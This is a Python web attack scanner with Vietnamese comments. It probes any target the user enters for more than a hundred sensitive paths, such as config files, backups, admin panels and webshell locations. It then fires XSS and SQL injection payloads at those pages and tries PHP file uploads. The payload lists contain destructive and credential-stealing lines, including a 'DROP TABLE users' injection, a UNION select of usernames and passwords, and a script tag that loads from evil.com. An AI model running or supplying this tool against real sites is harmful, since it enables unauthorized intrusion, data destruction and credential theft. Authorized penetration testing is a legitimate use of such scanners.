import requests
from bs4 import BeautifulSoup

# Headers
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.93"}

# Payloads mở rộng
PAYLOADS = {
    "XSS": [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>", "javascript:alert('XSS')",
        "<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<a href=javascript:alert(1)>click", "\" onmouseover=\"alert(1)",
        "<script/src=//evil.com/xss.js></script>", "<details open ontoggle=alert(1)>"
    ],
    "SQLi": [
        "' OR '1'='1", "1' UNION SELECT NULL,version()--", "' OR SLEEP(5)--",
        "1; DROP TABLE users--", "' AND 1=CONVERT(int,@@version)--",
        "admin' OR '1'='1'#", "1' WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 LIMIT 1--", "1' AND SUBSTRING(@@version,1,1)='5'",
        "1' ORDER BY 999--", "' UNION SELECT NULL,username,password FROM users--",
        "1' OR IF(1=1,SLEEP(5),0)--", "' OR 'a'='a"
    ]
}

# SQLi errors mở rộng
SQLI_ERRORS = [
    "error in your SQL syntax", "mysql_", "SQLSTATE[", "unclosed quotation",
    "Incorrect syntax near", "sqlite_", "ORA-", "PostgreSQL", "DB2 SQL",
    "You have an error", "Warning: mysql_fetch", "expects parameter",
    "Unknown column", "Invalid query", "SQL Server", "syntax error at or near",
    "division by zero", "ODBC Microsoft", "fetch_array", "query failed"
]

# Common paths mở rộng
COMMON_PATHS = [
    "/login", "/login.php", "/login.html", "/admin", "/admin.php", "/admin.html",
    "/dashboard", "/admin/login", "/auth", "/signin", "/user/login", "/adminpanel",
    "/controlpanel", "/secure", "/administrator", "/admin/index", "/adminconsole",
    "/moderator", "/sysadmin", "/staff", "/root", "/management",
    "/wp-login.php", "/wp-admin", "/wp-content", "/wp-config.php", "/wp-json",
    "/phpmyadmin", "/pma", "/adminer.php", "/joomla/administrator", "/drupal",
    "/typo3", "/magento/admin", "/laravel", "/laravel/admin", "/site/admin",
    "/cms", "/cms/admin", "/opencart/admin", "/prestashop/admin",
    "/config.php", "/.env", "/.git", "/.htaccess", "/config.json", "/settings.php",
    "/db.conf", "/database.yml", "/backup.zip", "/db.sql", "/dump.sql", "/admin.bak",
    "/config.inc.php", "/conf/global.ini", "/web.config", "/application.properties",
    "/secrets", "/credentials", "/private.key", "/config.bak", "/.gitignore",
    "/api", "/api/v1", "/api/v2", "/graphql", "/debug", "/test", "/staging",
    "/dev", "/qa", "/api/admin", "/api/token", "/swagger.json", "/trace.axd",
    "/api/swagger", "/api/docs", "/rest", "/v1/users", "/api/debug", "/console",
    "/uploads", "/upload", "/files", "/media", "/uploads/shell.php", "/upload.php",
    "/file_upload", "/uploads/test.jsp", "/uploads/rce.aspx", "/cgi-bin/upload.cgi",
    "/uploads/admin.php", "/upload_image", "/filemanager", "/user_uploads",
    "/content/uploads", "/temp/uploads", "/backup/uploads", "/uploads/webshell.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/wp-config.php.bak",
    "/adminer", "/server-status", "/.DS_Store", "/crossdomain.xml", "/phpinfo.php",
    "/index.php.bak", "/setup.php", "/install.php", "/admin/setup", "/xmlrpc.php",
    "/invoker/JMXInvokerServlet", "/jmx-console", "/web-console", "/status",
    "/error_log", "/access.log", "/logs", "/backup.tar.gz", "/old", "/temp",
    "/log.txt", "/error.txt", "/backup.sql.gz", "/logs/admin.log", "/archive",
    "/robots.txt", "/sitemap.xml", "/admin-console", "/webdav", "/jmx-console",
    "/hidden", "/private", "/public", "/data", "/assets", "/admin_area"
]

def req(url, method="GET", **kwargs):
    try:
        return requests.request(method, url, headers=HEADERS, timeout=5, verify=False, allow_redirects=True, **kwargs)
    except:
        return None

def check_xss(url, results):
    for payload in PAYLOADS["XSS"]:
        r = req(url, params={"q": payload, "search": payload, "input": payload})
        if r and payload in r.text:
            results["xss"].append(f"{url} with {payload}")
            print(f"[!] XSS at {url} with {payload}")

def check_sqli(url, results):
    for payload in PAYLOADS["SQLi"]:
        r = req(url, params={"id": payload, "user": payload, "name": payload})
        if r and any(err in r.text.lower() for err in SQLI_ERRORS):
            results["sqli"].append(f"{url} with {payload}")
            print(f"[!] SQLi at {url} with {payload}")

def check_upload(url, results):
    files = {"file": ("test.php", "<?php echo 'Hacked'; ?>", "application/x-php")}
    r = req(url, method="POST", files=files)
    if r and r.status_code == 200 and "Hacked" in r.text:
        results["upload"].append(url)
        print(f"[!] Upload vuln at {url}")

def scan_paths(target, proto, results):
    url = f"{proto}://{target}"
    default = req(url).text if req(url) else ""
    print(f"[+] Scanning {url}")
    
    for path in COMMON_PATHS:
        full_url = f"{url.rstrip('/')}{path}"
        r = req(full_url)
        if r and r.status_code == 200:
            if r.text != default:
                print(f"[+] Found unique {path} - Status: {r.status_code}")
                check_xss(full_url, results)
                check_sqli(full_url, results)
                if "upload" in path.lower() or "file" in path.lower():
                    check_upload(full_url, results)
            else:
                print(f"[-] Default {path}")
        elif r and r.status_code in [401, 403]:
            results["restricted"].append(f"{full_url} ({r.status_code})")
            print(f"[!] Restricted {path} - Possible sensitive endpoint")

def run_web_scan(target):
    target = target.split("://")[-1].strip("/")
    print(f"\n=== Web Scan on {target} ===")
    results = {"xss": [], "sqli": [], "upload": [], "restricted": []}
    
    for proto in ["http", "https"]:
        if req(f"{proto}://{target}"):
            scan_paths(target, proto, results)
    
    # Tổng hợp kết quả
    print("\n=== Scan Summary ===")
    print(f"Target: {target}")
    print(f"XSS Vulnerabilities: {len(results['xss'])} found")
    [print(f" - {x}") for x in results["xss"]]
    print(f"SQLi Vulnerabilities: {len(results['sqli'])} found")
    [print(f" - {s}") for s in results["sqli"]]
    print(f"Upload Vulnerabilities: {len(results['upload'])} found")
    [print(f" - {u}") for u in results["upload"]]
    print(f"Restricted Paths: {len(results['restricted'])} found")
    [print(f" - {r}") for r in results["restricted"]]
    print("Scan completed!")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    target = input("Enter target (IP/domain): ").strip()
    run_web_scan(target)